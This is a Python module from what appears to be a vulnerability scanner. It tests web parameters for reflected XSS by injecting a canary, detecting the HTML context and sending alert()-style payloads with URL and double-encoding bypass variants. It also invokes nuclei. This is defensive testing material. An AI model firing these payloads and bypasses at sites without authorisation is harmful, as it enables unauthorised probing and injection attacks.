"""
AEGIS-X XSS Reflected Scanner
Algorithm: Canary reflection detection + context-aware payload generation.
"""
import re
import uuid
from aegisx.core import http_client as requests
from typing import Dict, Any, List
from urllib.parse import urlparse, parse_qs, urlencode

from aegisx.core.orchestration.command_gateway import CommandGateway
from aegisx.core.ui.console import ConsoleUI


class XSSReflectedScanner:

    CONTEXT_PAYLOADS = {
        "html_body": [
            '<script>alert("AEGISX")</script>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '<body onload=alert(1)>',
        ],
        "html_attr": [
            '" onmouseover="alert(1)" x="',
            "' onmouseover='alert(1)' x='",
            '" onfocus="alert(1)" autofocus="',
        ],
        "js_context": [
            "';alert(1)//",
            '";alert(1)//',
            "</script><script>alert(1)</script>",
        ],
        "url_context": [
            "javascript:alert(1)",
            "data:text/html,<script>alert(1)</script>",
        ],
    }

    ENCODING_BYPASSES = [
        lambda p: p,  # No encoding
        lambda p: p.replace("<", "%3C").replace(">", "%3E"),  # URL encoded
        lambda p: p.replace("<", "%253C").replace(">", "%253E"),  # Double encoded
        lambda p: p.replace("<", "\\u003c").replace(">", "\\u003e"),  # Unicode
    ]

    def scan(self, target: str, routes: List[str]) -> List[Dict[str, Any]]:
        findings = []

        # Nuclei XSS scan
        nuclei_findings = self._run_nuclei_xss(target)
        findings.extend(nuclei_findings)

        # Custom reflection-based scan
        custom_findings = self._reflection_scan(target, routes)
        findings.extend(custom_findings)

        return findings

    def _run_nuclei_xss(self, target: str) -> List[Dict[str, Any]]:
        import json
        findings = []
        url = f"http://{target}"
        cmd = ["nuclei", "-u", url, "-tags", "xss", "-j", "-silent", "-timeout", "5"]
        result = CommandGateway.execute(cmd, timeout=120, description="XSS Detection (Nuclei)")

        if result["success"]:
            for line in result.get("stdout", "").strip().split("\n"):
                if line:
                    try:
                        data = json.loads(line)
                        sev = data.get("info", {}).get("severity", "info").upper()
                        if sev == "INFO":
                            continue
                        findings.append({
                            "finding_type": f"XSS (Reflected) [{data.get('template-id', '')}]",
                            "base_confidence": 0.92, "consensus_score": 0.92, "score_conflict": False,
                            "risk_level": "HIGH" if sev in ["HIGH", "CRITICAL"] else "MEDIUM",
                            "governance_class": "ACTIVE_VALIDATION",
                            "requires_human_approval": False,
                            "recommended_validation": ["Sanitize output encoding", "Implement CSP"],
                            "reasoning": [data.get("info", {}).get("name", ""), f"Matched: {data.get('matched-at', '')}"],
                            "nodes": [], "edges": [],
                        })
                    except Exception:
                        pass
        return findings

    def _reflection_scan(self, target: str, routes: List[str]) -> List[Dict[str, Any]]:
        findings = []
        base_url = f"http://{target}"

        for route in routes:
            url = f"{base_url}{route}" if route.startswith("/") else route
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            if not params:
                continue

            for pname in params:
                result = self._test_reflection(url, pname, params)
                if result:
                    findings.append(result)
                    break
        return findings

    def _test_reflection(self, url: str, param: str, params: dict) -> Dict[str, Any] | None:
        parsed = urlparse(url)
        burl = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        # Step 1: Inject canary to detect reflection
        canary = f"AEGISX{uuid.uuid4().hex[:8]}"
        tp = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
        tp[param] = canary

        try:
            resp = requests.get(f"{burl}?{urlencode(tp)}", timeout=5)
            if canary not in resp.text:
                return None  # Not reflected
        except Exception:
            return None

        ConsoleUI.info(f"[XSS-Reflected] Canary reflected in '{param}', testing payloads...")

        # Step 2: Determine context
        context = self._detect_context(resp.text, canary)

        # Step 3: Try context-appropriate payloads
        payloads = self.CONTEXT_PAYLOADS.get(context, self.CONTEXT_PAYLOADS["html_body"])

        for payload in payloads:
            for encode_fn in self.ENCODING_BYPASSES[:2]:  # Limit bypass attempts
                encoded_payload = encode_fn(payload)
                tp[param] = encoded_payload
                try:
                    resp = requests.get(f"{burl}?{urlencode(tp)}", timeout=5)
                    # Check if payload is reflected unmodified
                    if payload in resp.text or encoded_payload in resp.text:
                        ConsoleUI.success(f"[XSS-Reflected] Payload reflected unencoded: {param}")
                        return {
                            "finding_type": "XSS (Reflected) - Unencoded Reflection",
                            "base_confidence": 0.93, "consensus_score": 0.93, "score_conflict": False,
                            "risk_level": "HIGH", "governance_class": "ACTIVE_VALIDATION",
                            "requires_human_approval": False,
                            "recommended_validation": [
                                "HTML-encode all user input in output",
                                "Implement Content Security Policy (CSP)",
                                "Use context-aware output encoding",
                            ],
                            "reasoning": [
                                f"Reflected XSS via parameter '{param}' in {context} context",
                                f"Payload: {payload[:80]}",
                                f"URL: {burl}",
                            ],
                            "nodes": [], "edges": [],
                        }
                except Exception:
                    pass

        return None

    def _detect_context(self, html: str, canary: str) -> str:
        """Detect which HTML context the canary appears in."""
        idx = html.find(canary)
        if idx < 0:
            return "html_body"

        # Check preceding context
        before = html[max(0, idx - 200):idx].lower()

        if re.search(r'<script[^>]*>[^<]*$', before):
            return "js_context"
        if re.search(r'=["\'][^"\']*$', before):
            return "html_attr"
        if re.search(r'href\s*=\s*["\']?[^"\']*$', before):
            return "url_context"

        return "html_body"
